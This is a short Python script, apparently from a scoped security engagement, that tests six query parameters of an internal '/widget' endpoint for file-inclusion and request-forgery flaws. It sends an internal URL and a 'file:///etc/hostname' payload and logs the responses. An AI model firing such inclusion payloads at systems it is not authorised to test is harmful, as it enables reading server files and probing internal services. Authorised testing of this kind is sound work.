# INT-r27-0020 RFI matrix-test: /widget param family x in-scope payload shapes
# GET-only, no redirect following (http.client raw), interval >= 0.25s
import http.client, json, time, urllib.parse

HOST, PORT = "svc-portal", 8007
params = ["url", "uri", "src", "include", "file", "page"]
payloads = {
    "http-svc-login": "http://svc-login:8004/",
    "file-scheme": "file:///etc/hostname",
}
out = {"meta": {"intent": "INT-r27-0020", "kind": "rfi-matrix", "ts_literal": "2026-10-23T16:00:00Z"}, "cases": []}

def get_raw(path):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=6)
    raw_req = "GET %s HTTP/1.1\r\nHost: %s:%d\r\n\r\n" % (path, HOST, PORT)
    t0 = time.time()
    try:
        conn.request("GET", path)
        r = conn.getresponse()
        body = r.read(1200).decode("utf-8", "replace")
        res = {
            "raw_request": raw_req,
            "resp_status": r.status,
            "resp_headers": {k: v for k, v in r.getheaders()},
            "resp_body_excerpt": body[:400],
            "body_full_len": len(body),
            "elapsed_ms": int((time.time() - t0) * 1000),
        }
    except Exception as e:
        res = {"raw_request": raw_req, "error": repr(e)[:160]}
    finally:
        conn.close()
    return res

# control pairs: bare endpoint + empty-param baselines
out["cases"].append({"case": "baseline", "param": None, "payload": None, "path": "/widget", **get_raw("/widget")})
time.sleep(0.3)
for p in params:
    q = "/widget?%s=" % p
    out["cases"].append({"case": "empty-param-baseline", "param": p, "payload": None, "path": q, **get_raw(q)})
    time.sleep(0.3)

# payload matrix (urlencoded values)
for pname, pval in payloads.items():
    for p in params:
        q = "/widget?%s=%s" % (p, urllib.parse.quote(pval, safe=""))
        out["cases"].append({"case": "payload", "param": p, "payload": pname, "payload_raw": pval, "path": q, **get_raw(q)})
        time.sleep(0.3)

print(json.dumps(out, ensure_ascii=False, indent=1))
